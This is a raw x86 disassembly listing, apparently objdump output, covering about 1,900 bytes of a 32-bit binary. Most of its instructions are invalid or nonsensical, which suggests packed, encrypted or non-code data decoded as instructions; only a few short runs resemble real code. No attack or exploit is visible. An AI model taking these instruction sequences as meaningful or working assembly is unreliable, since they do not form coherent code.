  411da2:	fisttp WORD PTR [esi+0x44c2ba9]
  411da8:	push   ecx
  411da9:	(bad)  
  411daa:	out    dx,al
  411dab:	inc    esp
  411dac:	aaa    
  411dad:	or     eax,ebx
  411daf:	fs xchg ebp,eax
  411db1:	in     al,0xa1
  411db3:	adc    BYTE PTR [edx+0x4d],bh
  411db6:	mov    ah,0xcd
  411db8:	mov    ah,0x2f
  411dba:	js     0x411d4b
  411dbc:	ror    BYTE PTR [eax+0x260c243d],cl
  411dc2:	gs in  al,dx
  411dc4:	aam    0xb9
  411dc6:	pop    ds
  411dc7:	aad    0xc3
  411dc9:	inc    ecx
  411dca:	mov    bl,0x8c
  411dcc:	sahf   
  411dcd:	pop    eax
  411dce:	pop    ebp
  411dcf:	rcr    BYTE PTR [edx+0x54bab5d8],1
  411dd5:	in     eax,0x56
  411dd7:	daa    
  411dd8:	sbb    bl,ch
  411dda:	sahf   
  411ddb:	js     0x411dd2
  411ddd:	push   ecx
  411dde:	xchg   esi,eax
  411ddf:	pop    esi
  411de0:	jnp    0x411e3c
  411de2:	(bad)  
  411de3:	lods   al,BYTE PTR ds:[esi]
  411de4:	pop    es
  411de5:	loopne 0x411e62
  411de7:	bound  ebp,QWORD PTR [edi]
  411de9:	retf   0x903a
  411dec:	aaa    
  411ded:	lods   al,BYTE PTR ds:[esi]
  411dee:	mov    ss,WORD PTR [eax+ecx*8-0x2]
  411df2:	and    eax,0x906a0818
  411df7:	or     DWORD PTR [edx],edx
  411df9:	xchg   edx,eax
  411dfa:	mov    dl,0x90
  411dfc:	xor    DWORD PTR [esi-0x7f],0xffffffdf
  411e00:	fldenv [edi]
  411e02:	cmp    eax,0xc5edf541
  411e07:	cmp    esi,ebx
  411e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e0a:	jbe    0x411dc7
  411e0c:	adc    eax,0x5874495
  411e11:	pop    esp
  411e12:	mov    cl,0x7f
  411e14:	pop    eax
  411e15:	xchg   esi,eax
  411e16:	sbb    al,BYTE PTR [ebp-0x14857da2]
  411e1c:	les    edi,FWORD PTR [ecx]
  411e1e:	jge    0x411e75
  411e20:	sbb    eax,0x314b269e
  411e25:	out    0x5c,al
  411e27:	adc    DWORD PTR [ebx-0x74],esi
  411e2a:	inc    ebx
  411e2b:	push   edi
  411e2c:	fisttp DWORD PTR [edx-0x69b846fb]
  411e32:	outs   dx,DWORD PTR ds:[esi]
  411e33:	and    bl,ah
  411e35:	imul   ebx,DWORD PTR [edx-0x73],0xcefb37fd
  411e3c:	ds sbb bh,ch
  411e3f:	mov    ds:0xa4b3d521,al
  411e44:	jecxz  0x411e60
  411e46:	(bad)
  411e4a:	cmc    
  411e4b:	stos   DWORD PTR es:[edi],eax
  411e4c:	ins    BYTE PTR es:[edi],dx
  411e4d:	sub    ecx,ebp
  411e4f:	(bad)  
  411e50:	in     eax,0x29
  411e52:	dec    edi
  411e53:	std    
  411e54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e55:	in     eax,0xc8
  411e57:	sbb    al,0x92
  411e59:	sbb    dl,BYTE PTR [ecx+0x7d]
  411e5c:	adc    BYTE PTR [ebp+ecx*8+0x21],cl
  411e60:	adc    al,0xda
  411e62:	fnstsw WORD PTR [edi-0x22]
  411e65:	arpl   WORD PTR [ecx],ax
  411e67:	ins    DWORD PTR es:[edi],dx
  411e68:	and    al,0xc3
  411e6a:	or     BYTE PTR [eax],dh
  411e6c:	mov    al,0x35
  411e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e6f:	cmp    al,0x4f
  411e71:	pop    ecx
  411e72:	rol    DWORD PTR [edx+0x57bb8917],0x33
  411e79:	xor    al,0xef
  411e7b:	pop    eax
  411e7c:	arpl   WORD PTR [edx],cx
  411e7e:	clc    
  411e7f:	imul   esi,edx,0x17ed4038
  411e85:	mov    ebp,0x64b9b54a
  411e8a:	jecxz  0x411e52
  411e8c:	cmp    ebp,DWORD PTR [edi]
  411e8e:	inc    ebp
  411e8f:	add    al,BYTE PTR [eax-0x21e5871d]
  411e95:	mov    eax,ds:0x8d7c399b
  411e9a:	cwde   
  411e9b:	sbb    ebx,esi
  411e9d:	adc    eax,0x7392721f
  411ea2:	add    eax,0x2a739ee1
  411ea7:	ja     0x411ed3
  411ea9:	mov    edx,0xb86c7711
  411eae:	and    eax,0x88934324
  411eb3:	mov    DWORD PTR [eax+ecx*4+0x75],esp
  411eb7:	xchg   esi,eax
  411eb8:	sbb    eax,0x628c1f8f
  411ebd:	mov    esi,0xc389f0be
  411ec2:	mov    ds:0x8196fd53,al
  411ec7:	and    BYTE PTR [ebx],ah
  411ec9:	and    BYTE PTR [edi],dl
  411ecb:	(bad)  
  411ecc:	sub    al,0xbc
  411ece:	jge    0x411f0d
  411ed0:	outs   dx,DWORD PTR ds:[esi]
  411ed1:	and    bl,dl
  411ed3:	adc    al,0x21
  411ed5:	(bad)
  411ed8:	push   edx
  411ed9:	pop    esp
  411eda:	gs ret 
  411edc:	add    esi,DWORD PTR [eax-0x5c161191]
  411ee2:	lods   eax,DWORD PTR ds:[esi]
  411ee3:	inc    eax
  411ee4:	outs   dx,DWORD PTR ds:[esi]
  411ee5:	(bad)  
  411ee6:	shl    DWORD PTR [edx],cl
  411ee8:	not    dh
  411eea:	mov    dh,0x39
  411eec:	and    al,0xdc
  411eee:	adc    DWORD PTR [eax],ebx
  411ef0:	pop    ss
  411ef1:	sbb    al,0x33
  411ef3:	fwait
  411ef4:	jmp    DWORD PTR ds:0xc09255a5
  411efa:	add    BYTE PTR [edx+0xc1b5d9b],0x46
  411f01:	sti    
  411f02:	mov    al,0xf6
  411f04:	hlt    
  411f05:	icebp  
  411f06:	jno    0x411eb7
  411f08:	lock mov al,0x17
  411f0b:	scas   eax,DWORD PTR es:[edi]
  411f0c:	fimul  DWORD PTR [eax]
  411f0e:	out    0x8,al
  411f10:	cmp    eax,ebp
  411f12:	out    0x2d,eax
  411f14:	repnz adc esi,0x60e76c02
  411f1b:	mov    ebp,edi
  411f1d:	daa    
  411f1e:	pop    ds
  411f1f:	pop    ebp
  411f20:	xchg   ebp,eax
  411f21:	ins    BYTE PTR es:[edi],dx
  411f22:	pop    es
  411f23:	sbb    DWORD PTR ds:0x7c8088a,ebx
  411f29:	cmp    dh,bl
  411f2b:	ror    DWORD PTR [ebp+0x71836325],0xbb
  411f32:	test   eax,0xc3b3aeb3
  411f37:	inc    esi
  411f38:	push   cs
  411f39:	mov    ebx,0x452940f2
  411f3e:	push   ds
  411f3f:	sub    dh,BYTE PTR [ebp-0x95ec6d6]
  411f45:	jmp    FWORD PTR [edx-0x37]
  411f48:	in     al,dx
  411f49:	sbb    eax,0xa1a9743e
  411f4e:	jmp    0x76ddf9e0
  411f53:	jg     0x411f74
  411f55:	test   al,0xb4
  411f57:	sar    ebx,0xe8
  411f5a:	arpl   bp,si
  411f5c:	mov    ch,0x20
  411f5e:	lock mov bl,0x2f
  411f61:	mov    al,al
  411f63:	push   edx
  411f64:	fisubr WORD PTR [edx-0x4f]
  411f67:	mov    ds:0x2b38015a,eax
  411f6c:	call   0x47d2:0x51fb569d
  411f73:	mov    edx,DWORD PTR [ebp-0x3c]
  411f76:	mov    edi,DWORD PTR [ebp-0x4]
  411f79:	xor    edi,eax
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	inc    esp
  411f8f:	dec    esp
  411f90:	fisttp QWORD PTR [ebx+ebp*8]
  411f93:	imul   edi,DWORD PTR [eax+0x78],0xffffffe5
  411f97:	jle    0x412011
  411f99:	js     0x411f6f
  411f9b:	ja     0x411f50
  411f9d:	mov    edx,0x81926dd6
  411fa2:	add    BYTE PTR [eax+0x42],0xca
  411fa6:	inc    eax
  411fa7:	mov    al,0x96
  411fa9:	jmp    0x411fc5
  411fab:	fist   WORD PTR [ecx]
  411fad:	fbld   TBYTE PTR [edx]
  411faf:	adc    al,0xb8
  411fb1:	add    ecx,0xffffffe3
  411fb4:	inc    esp
  411fb5:	loop   0x411ff6
  411fb7:	pop    ecx
  411fb8:	in     eax,dx
  411fb9:	test   BYTE PTR [ebx+0x4ae34286],0x74
  411fc0:	fwait
  411fc1:	inc    BYTE PTR [eax-0x65b27739]
  411fc7:	int    0x94
  411fc9:	outs   dx,BYTE PTR ds:[esi]
  411fca:	rcl    DWORD PTR [ecx],cl
  411fcc:	mov    esi,0x8c51ab65
  411fd1:	pop    ebp
  411fd2:	ret    
  411fd3:	fist   WORD PTR [edx]
  411fd5:	lahf   
  411fd6:	jmp    0x98a0:0xbab090c6
  411fdd:	inc    ebx
  411fde:	mov    ebx,0x9fa2001a
  411fe3:	imul   ecx,DWORD PTR [esp+eiz*2-0xd46768c],0x43
  411feb:	loopne 0x412020
  411fed:	inc    ebx
  411fee:	outs   dx,BYTE PTR ds:[esi]
  411fef:	popa   
  411ff0:	test   al,0xea
  411ff2:	(bad)  
  411ff3:	cmp    esi,DWORD PTR [esi+ecx*2+0x2d28566b]
  411ffa:	and    ecx,edi
  411ffc:	adc    DWORD PTR [edx],0x224aca34
  412002:	adc    BYTE PTR [ebx+0x33f62281],cl
  412008:	imul   esi,DWORD PTR [ebx-0x4e],0xdd1dc844
  41200f:	cmovp  ebx,DWORD PTR [edx]
  412012:	pop    ebp
  412013:	(bad)  
  412014:	dec    esi
  412015:	fdiv   DWORD PTR [eax+0x4e773300]
  41201b:	scas   al,BYTE PTR es:[edi]
  41201c:	mov    edi,0x854546a0
  412021:	aad    0xa1
  412023:	adc    eax,0xde719397
  412028:	inc    ebp
  412029:	or     ebx,DWORD PTR [ebx-0x16]
  41202c:	mov    ds:0xee5e1534,eax
  412031:	test   al,0x92
  412033:	xchg   esp,eax
  412034:	jne    0x41207f
  412036:	sub    ch,0x7e
  412039:	out    dx,eax
  41203a:	and    DWORD PTR [esi],esi
  41203c:	ja     0x412088
  41203e:	shl    ecx,cl
  412040:	or     eax,0x8b6461c6
  412045:	das    
  412046:	ss loopne 0x41206a
  412049:	icebp  
  41204a:	cmp    ebx,DWORD PTR [eax+0x37c42200]
  412050:	mov    WORD PTR [edi],gs
  412052:	sbb    eax,0xa2b602d2
  412057:	popa   
  412058:	scas   eax,DWORD PTR es:[edi]
  412059:	fiadd  DWORD PTR [ebx+0x8]
  41205c:	sar    dh,cl
  41205e:	test   BYTE PTR [esi+edi*4-0x68fbe746],ah
  412065:	mov    eax,edi
  412067:	fadd   DWORD PTR [esi+0x24]
  41206a:	lods   al,BYTE PTR ds:[esi]
  41206b:	jg     0x412077
  41206d:	loop   0x412091
  41206f:	mov    al,0x2c
  412071:	cmp    bl,BYTE PTR [edi-0x60]
  412074:	std    
  412075:	test   BYTE PTR [edx+0x1a231dbc],dl
  41207b:	arpl   WORD PTR [ecx],sp
  41207d:	and    DWORD PTR [ecx+edi*8-0x28],edi
  412081:	aaa    
  412082:	and    ch,BYTE PTR [ecx]
  412084:	loope  0x412048
  412086:	es xor dh,ch
  412089:	lds    esi,FWORD PTR [ebx+0x64]
  41208c:	pushf  
  41208d:	adc    dh,bh
  41208f:	hlt    
  412090:	add    al,0xac
  412092:	gs call 0xbb8d1b49
  412098:	xlat   BYTE PTR ds:[ebx]
  412099:	push   esi
  41209a:	inc    ebp
  41209b:	dec    edi
  41209c:	aaa    
  41209d:	imul   eax,ecx,0x738a0036
  4120a3:	pop    ebp
  4120a4:	fucom  st(0)
  4120a6:	pushf  
  4120a7:	retf   
  4120a8:	mov    al,ds:0x8acff53b
  4120ad:	xor    BYTE PTR [ebp+0x40],bh
  4120b0:	push   eax
  4120b1:	fsub   QWORD PTR [ebp-0x47]
  4120b4:	adc    DWORD PTR [eax-0x12fe3ba0],ebp
  4120ba:	mov    WORD PTR [ebx+0x12],ss
  4120bd:	dec    edx
  4120be:	lods   eax,DWORD PTR ds:[esi]
  4120bf:	loop   0x41204f
  4120c1:	xchg   esi,eax
  4120c2:	inc    edx
  4120c3:	push   0xffffff92
  4120c5:	sbb    DWORD PTR ds:0x59754980,0x18
  4120cc:	fwait
  4120cd:	mov    esp,0xd09ac5fc
  4120d2:	call   0x2258:0xac220b7b
  4120d9:	push   ecx
  4120da:	push   eax
  4120db:	cld    
  4120dc:	xchg   edx,eax
  4120dd:	gs cs ja 0x412108
  4120e1:	cdq    
  4120e2:	pusha  
  4120e3:	mov    ds:0x277f09c6,eax
  4120e8:	cs jns 0x4120a0
  4120eb:	inc    eax
  4120ec:	and    eax,0x34b2147d
  4120f1:	jnp    0x412140
  4120f3:	xlat   BYTE PTR ds:[ebx]
  4120f4:	(bad)
  4120f8:	and    al,BYTE PTR [esi]
  4120fa:	js     0x4120e9
  4120fc:	xor    DWORD PTR [ebp-0x4a3b9f56],ecx
  412102:	ss xchg BYTE PTR es:[ecx+0x28d71bcc],cl
  41210a:	sahf   
  41210b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41210c:	xor    esp,DWORD PTR [ebp-0xd870e6d]
  412112:	jo     0x412102
  412114:	mov    edi,0x23ca945c
  412119:	repz ror dh,1
  41211c:	jmp    0x10dc:0xfae29f73
  412123:	sbb    DWORD PTR [eax-0x7d],edx
  412126:	sub    dh,BYTE PTR [edi]
  412128:	sbb    ecx,DWORD PTR [ebp+0x5a]
  41212b:	inc    ebx
  41212c:	or     dh,bh
  41212e:	into   
  41212f:	inc    eax
  412130:	and    ah,BYTE PTR [eax-0x1cd6e79e]
  412136:	push   esp
  412137:	sahf   
  412138:	std    
  412139:	and    dh,BYTE PTR [edx]
  41213b:	sub    al,0x62
  41213d:	mov    esp,0xb1269ad1
  412142:	mov    cl,0x35
  412144:	add    DWORD PTR [eax+0x32],0xffffffc0
  412148:	and    ebp,DWORD PTR ds:0xd9b38357
  41214e:	jmp    0x2926c777
  412153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412154:	and    DWORD PTR [edi],esp
  412156:	push   esi
  412157:	mov    edx,0xc0c9f754
  41215c:	mov    ss,WORD PTR [edx-0x6c]
  41215f:	mov    cl,0x4c
  412161:	out    dx,eax
  412162:	sub    esp,ebp
  412164:	ss sbb eax,0xa3e2bc9e
  41216a:	cld    
  41216b:	mov    ds,WORD PTR [edx]
  41216d:	nop
  41216e:	cmc    
  41216f:	(bad)  
  412170:	cmp    eax,0xf7bcd451
  412175:	xor    eax,0x13a6d4b5
  41217a:	cld    
  41217b:	cmp    ch,al
  41217d:	xor    BYTE PTR [esi-0x59],dl
  412180:	pop    ebp
  412181:	mov    bl,0xb8
  412183:	fiadd  WORD PTR [ecx+0x36d0f1c]
  412189:	mov    esi,ebp
  41218b:	bound  edx,QWORD PTR [esi*2-0x63bc4061]
  412192:	sub    eax,0x63c5453d
  412197:	sti    
  412198:	bound  esp,QWORD PTR [edi-0x2078ee93]
  41219e:	sar    cl,cl
  4121a0:	xchg   BYTE PTR [ebx],bl
  4121a2:	out    0xbb,eax
  4121a4:	push   eax
  4121a5:	mov    ebx,eax
  4121a7:	adc    al,BYTE PTR [ebx-0x75]
  4121aa:	mov    bl,dl
  4121ac:	push   ss
  4121ad:	push   es
  4121ae:	dec    ecx
  4121af:	std    
  4121b0:	call   0x9f56:0x66942ff2
  4121b7:	stos   BYTE PTR es:[edi],al
  4121b8:	(bad)  
  4121ba:	xor    dl,BYTE PTR [edx-0x6]
  4121bd:	cmp    eax,0xebdfa47c
  4121c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c3:	mov    bl,0x80
  4121c5:	aaa    
  4121c6:	lock les esp,FWORD PTR [edx-0x1d]
  4121ca:	add    al,0xf6
  4121cc:	popf   
  4121cd:	xor    edi,0x18
  4121d0:	shr    DWORD PTR [edx-0x56407466],cl
  4121d6:	mov    ecx,0xb7891c0b
  4121db:	shl    DWORD PTR [edx-0xc],cl
  4121de:	cmp    eax,0xeb48f323
  4121e3:	(bad)  
  4121e4:	push   es
  4121e5:	je     0x4121b8
  4121e7:	and    DWORD PTR [ecx],ebp
  4121e9:	adc    dl,al
  4121eb:	pop    es
  4121ec:	mov    dh,0x93
  4121ee:	ffreep st(2)
  4121f0:	cmp    ah,BYTE PTR [ebx-0x42cdf654]
  4121f6:	pop    ecx
  4121f7:	aad    0x85
  4121f9:	ja     0x41226c
  4121fb:	ficom  WORD PTR [edx+0x2f]
  4121fe:	xor    al,0x46
  412200:	shr    DWORD PTR [esi-0x5e],1
  412203:	and    eax,0x3f90394
  412208:	ror    DWORD PTR [edi],1
  41220a:	scas   eax,DWORD PTR es:[edi]
  41220b:	xlat   BYTE PTR ds:[ebx]
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	or     eax,0x503a3ab3
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	cmp    ch,BYTE PTR [ebx-0x46bf7fcf]
  412245:	xchg   ecx,eax
  412246:	cmp    edi,0x9923007a
  41224c:	mov    eax,0x15158fd4
  412251:	xor    dl,ah
  412253:	(bad)  
  412254:	sub    eax,0x92245ee5
  412259:	js     0x4122cd
  41225b:	sub    esp,DWORD PTR [ebp-0x6c]
  41225e:	clc    
  41225f:	cli    
  412260:	(bad)  
  412261:	call   0xd512:0xe382f1a4
  412268:	xchg   eax,edx
  41226a:	sub    eax,0xb38d2941
  41226f:	mov    ebx,?
  412271:	loop   0x412288
  412273:	jge    0x4122b8
  412275:	cmc    
  412276:	mov    WORD PTR [edi],fs
  412278:	into   
  412279:	cmp    eax,0x12776d0b
  41227e:	adc    al,BYTE PTR [esi-0x50]
  412281:	jbe    0x4122b1
  412283:	dec    edi
  412284:	xchg   esp,eax
  412285:	into   
  412286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412287:	push   ecx
  412288:	in     eax,dx
  412289:	rcl    ah,1
  41228b:	ja     0x4122f7
  41228d:	cmp    DWORD PTR [eax+esi*8-0x47],esp
  412291:	mov    bh,0x21
  412293:	jmp    0x6272b05c
  412298:	xor    eax,0xd00c34f8
  41229d:	out    dx,al
  41229e:	sbb    eax,0x18b587b6
  4122a3:	js     0x41229f
  4122a5:	inc    ecx
  4122a6:	or     DWORD PTR [esi],eax
  4122a8:	cs push ebx
  4122aa:	ret    
  4122ab:	mov    ss,WORD PTR [ebp+ebp*2+0x630f06a4]
  4122b2:	sbb    BYTE PTR [ecx],cl
  4122b4:	in     al,dx
  4122b5:	inc    esp
  4122b6:	xchg   ch,ah
  4122b8:	mov    ebx,0x9d5cdaf1
  4122bd:	in     al,0x6b
  4122bf:	int    0xfc
  4122c1:	test   DWORD PTR [edx+0x17],0xdcbeb038
  4122c8:	add    eax,0x36128ff3
  4122cd:	lock pop ebp
  4122cf:	pop    es
  4122d0:	mov    BYTE PTR [ecx],cl
  4122d2:	les    ebx,FWORD PTR [ecx-0x21]
  4122d5:	and    eax,0x54c3444
  4122da:	xor    eax,DWORD PTR gs:[eax+0x471ca37f]
  4122e1:	dec    edx
  4122e2:	cmp    al,0xe3
  4122e4:	mov    ss,WORD PTR [edi+edx*4-0x38]
  4122e8:	std    
  4122e9:	pop    esp
  4122ea:	je     0x412318
  4122ec:	neg    DWORD PTR [eax]
  4122ee:	sbb    BYTE PTR [ebp-0x10],bh
  4122f1:	iret   
  4122f2:	test   al,0xd2
  4122f4:	shr    cl,cl
  4122f6:	inc    ebp
  4122f7:	aaa    
  4122f8:	sbb    eax,0x88a996da
  4122fd:	pop    ecx
  4122fe:	idiv   DWORD PTR [edi+eiz*1-0x75bc27f2]
  412305:	cmp    dh,BYTE PTR [ecx]
  412307:	add    DWORD PTR ds:0xfe8fe7a5,esi
  41230d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41230e:	push   0xffffffe4
  412310:	jo     0x412307
  412312:	sti    
  412313:	xchg   edi,eax
  412314:	loope  0x412361
  412316:	loope  0x412298
  412318:	xor    BYTE PTR [eax+0x51],al
  41231b:	fstp   QWORD PTR [ecx+0x3ca9fcdf]
  412321:	(bad)  
  412322:	std    
  412323:	shl    DWORD PTR [edi+0x5488660a],1
  412329:	push   edi
  41232a:	or     BYTE PTR [ebp+0x2de5314b],ch
  412330:	in     al,dx
  412331:	clc    
  412332:	push   ebp
  412333:	pop    ebp
  412334:	sar    DWORD PTR [edx],cl
  412336:	cld    
  412337:	add    al,0xd3
  412339:	loope  0x4122f7
  41233b:	emms   
  41233d:	push   ebx
  41233e:	sbb    eax,0x5b0f0f53
  412343:	pop    edi
  412344:	cld    
  412345:	inc    edi
  412346:	pop    ecx
  412347:	std    
  412348:	pop    ss
  412349:	inc    esp
  41234a:	(bad)  
  41234b:	leave  
  41234c:	pop    ss
  41234d:	arpl   WORD PTR [edi-0x45],cx
  412350:	sbb    BYTE PTR [ecx],bh
  412352:	(bad)  
  412353:	fild   DWORD PTR [eax+ecx*8-0x3c]
  412357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412358:	aaa    
  412359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41235a:	jge    0x4123cd
  41235c:	imul   ebp,DWORD PTR [esi+0x50],0xe275576c
  412363:	xchg   ecx,eax
  412364:	pop    edi
  412365:	leave  
  412366:	js     0x4123a6
  412368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412369:	xchg   BYTE PTR [edx+0x30],ah
  41236c:	push   eax
  41236d:	stc    
  41236e:	jnp    0x412379
  412370:	mov    eax,ds:0x649a57b6
  412375:	add    eax,0x573f5bf6
  41237a:	das    
  41237b:	out    0xf,al
  41237d:	fcomip st,st(1)
  41237f:	pop    esi
  412380:	add    eax,0x8108b735
  412385:	adc    al,0x9a
  412387:	inc    esp
  412388:	mov    dh,0xcb
  41238a:	fcomp  QWORD PTR [esp+eax*1-0x2]
  41238e:	lods   eax,DWORD PTR ds:[esi]
  41238f:	ret    
  412390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412391:	ds std 
  412393:	enter  0xd13,0xdc
  412397:	and    al,0x29
  412399:	dec    ebp
  41239b:	pop    ebp
  41239c:	pop    ebx
  41239d:	retf   
  41239e:	or     BYTE PTR [esi],dh
  4123a0:	mov    ebp,0xcb4f2a90
  4123a5:	popa   
  4123a6:	push   ss
  4123a7:	push   edi
  4123a8:	jae    0x4123ee
  4123aa:	in     eax,0x25
  4123ac:	sahf   
  4123ad:	rol    BYTE PTR [esp+edi*8],cl
  4123b0:	or     eax,0xcf11b541
  4123b5:	push   ecx
  4123b6:	enter  0xf726,0x48
  4123ba:	inc    eax
  4123bb:	ret    0xdfd3
  4123be:	pop    edx
  4123bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123c0:	inc    eax
  4123c1:	pushf  
  4123c2:	mov    al,0x1
  4123c4:	shl    ebp,0x4b
  4123c7:	das    
  4123c8:	or     eax,0xbfc1a7d6
  4123cd:	adc    DWORD PTR [ecx-0x10],ebx
  4123d0:	jno    0x4123e0
  4123d2:	dec    esi
  4123d3:	xchg   edx,eax
  4123d4:	jmp    0x412451
  4123d6:	sub    ebp,eax
  4123d8:	push   ebx
  4123d9:	mov    al,0x4
  4123db:	sub    DWORD PTR [ecx+0x5d],edi
  4123de:	aas    
  4123df:	cmc    
  4123e0:	or     al,0x1
  4123e2:	and    BYTE PTR ds:0x8a5f4b7,0x94
  4123e9:	in     eax,dx
  4123ea:	xchg   esp,ebx
  4123ec:	je     0x412440
  4123ee:	clc    
  4123ef:	and    al,0xe2
  4123f1:	fidivr DWORD PTR cs:[edi+0x6f2e16b0]
  4123f8:	dec    esp
  4123f9:	in     al,0x7a
  4123fb:	adc    eax,0x7f478c98
  412400:	xlat   BYTE PTR ds:[ebx]
  412401:	pop    esp
  412402:	mov    ah,0xce
  412404:	mov    eax,ds:0xe94bfd95
  412409:	and    al,0xa7
  41240b:	add    al,0x3a
  41240d:	push   ds
  41240e:	mov    ds:0xe531eaa1,eax
  412413:	frstor [ebx+0x68]
  412416:	jecxz  0x4123ec
  412418:	cmc    
  412419:	inc    esi
  41241a:	ficom  WORD PTR ds:0x7664e09f
  412420:	fidiv  WORD PTR [ecx-0x39067c3e]
  412426:	daa    
  412427:	int3   
  412428:	das    
  412429:	sbb    DWORD PTR [ecx],0xffffffd1
  41242c:	inc    esp
  41242d:	or     BYTE PTR [eax-0x7d],bh
  412430:	(bad)  
  412431:	arpl   WORD PTR [esi+0x208b3c50],dx
  412437:	push   ebp
  412438:	aas    
  412439:	sub    esi,esp
  41243b:	mov    es,WORD PTR [esi+0x6db649ba]
  412441:	in     eax,0x13
  412443:	call   0x96892cac
  412448:	add    al,0x4c
  41244a:	scas   eax,DWORD PTR es:[edi]
  41244b:	xchg   ebp,eax
  41244c:	es shl ebp,0x5c
  412450:	jnp    0x412417
  412452:	mov    cl,0x2f
  412454:	mov    ah,0xe8
  412456:	div    dh
  412458:	fnsave [ecx+0x25]
  41245b:	loope  0x412467
  41245d:	pop    ebp
  41245e:	dec    edx
  41245f:	loope  0x4123f0
  412461:	sub    dh,BYTE PTR [eax+0x3e]
  412464:	loop   0x412470
  412466:	mov    ecx,cs
  412468:	(bad)  
  412469:	jl     0x41248f
  41246b:	add    ch,BYTE PTR ds:0x7ccebdb6
  412471:	adc    eax,0xe6088b3b
  412476:	les    ebx,FWORD PTR [edi]
  412478:	and    cl,BYTE PTR [edx+0x6c]
  41247b:	xchg   dl,bl
  41247d:	rcl    al,cl
  41247f:	pop    ss
  412480:	mov    eax,0x797b7470
  412485:	push   es
  412486:	pop    es
  412487:	jge    0x4124c8
  412489:	xlat   BYTE PTR ds:[ebx]
  41248a:	sub    al,0xb3
  41248c:	ret    
  41248d:	cmp    eax,0x3779b823
  412492:	cld    
  412493:	ins    BYTE PTR es:[edi],dx
  412494:	out    0xc1,al
  412496:	sub    BYTE PTR [ebp-0x31],bh
  412499:	and    ch,BYTE PTR [edx+esi*2]
  41249c:	mov    ?,ebx
  41249e:	aas    
  41249f:	bound  edi,QWORD PTR [eax-0x29]
  4124a2:	mov    ebx,0x71327822
  4124a7:	popf   
  4124a8:	stc    
  4124a9:	mov    esi,0xe9e45589
  4124ae:	add    DWORD PTR [edx],0x0
  4124b1:	add    bh,cl
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0xaa1ebe60
  4124bf:	push   ecx
  4124c0:	jae    0x412500
  4124c2:	cmp    eax,0xe578786e
  4124c7:	jle    0x412541
  4124c9:	js     0x4124a2
  4124cb:	pop    esp
  4124cc:	dec    ebx
  4124cd:	iret   
  4124ce:	sar    ebx,cl
  4124d0:	mov    ebx,0x6535525b
  4124d5:	xlat   BYTE PTR ss:[ebx]
  4124d7:	dec    eax
  4124d8:	gs stos BYTE PTR es:[edi],al
  4124da:	adc    eax,0xba3acb07
  4124df:	xchg   edi,eax
  4124e0:	xor    BYTE PTR [esi],ch
  4124e2:	js     0x4124dc
  4124e4:	shl    DWORD PTR [ecx+ebp*1-0x2cf6df5f],cl
  4124eb:	cmp    DWORD PTR [ebx],0x5c11d3cf
  4124f1:	div    DWORD PTR [edx-0x18]
  4124f4:	popf   
  4124f5:	xchg   dl,dl
  4124f7:	lahf   
  4124f8:	fwait
  4124f9:	inc    ebp
  4124fa:	cmp    BYTE PTR [edx+ebx*1+0x47],dl
  4124fe:	pop    ebp
  4124ff:	dec    edi
  412500:	mov    BYTE PTR [eax-0x239c010f],bl
  412506:	cmp    eax,0x3d33d142
  41250b:	push   cs
  41250c:	mov    al,ds:0xd82b83c3
  412511:	sbb    al,0x2
  412513:	addr16 daa 
  412515:	loope  0x4124fc
  412517:	push   ds
  412518:	dec    edi
  412519:	loopne 0x41257e
  41251b:	stc    
  41251c:	or     edi,DWORD PTR [esi]
  41251e:	rcl    DWORD PTR [edi-0x6f8101eb],cl
  412524:	js     0x4124b5
  412526:	rol    BYTE PTR [ebp-0x3b],1
  412529:	adc    DWORD PTR [ebx-0x13],edi
  41252c:	das    
  41252d:	or     bl,BYTE PTR [eax+0x1b]
  412530:	mov    edi,ebp
  412532:	inc    edx
  412533:	jecxz  0x4124f2
  412535:	jno    0x4124b7
  412537:	inc    ebx
  412538:	dec    esp
  412539:	std    
  41253a:	adc    al,0x4b
  41253c:	pop    ebx
  41253d:	xchg   BYTE PTR [ebx],bl
  41253f:	sub    edi,ecx
  412541:	xchg   DWORD PTR [ecx-0x16488493],edx
  412547:	cli    
  412548:	rcr    BYTE PTR [edi],1
  41254a:	mov    BYTE PTR [edi],0xaf
  41254d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41254f:	fcomp  DWORD PTR [esi]
  412551:	push   ebp
  412552:	imul   edi,DWORD PTR [ebx+0x40],0x1f5a3909
  412559:	jbe    0x41256b
  41255b:	mov    ah,0xec
  41255d:	int    0x31
  41255f:	cmp    ax,0x7a9e
  412563:	loopne 0x41257c
  412565:	(bad)  
  412566:	fldenv [edx+0x625768c6]
  41256c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
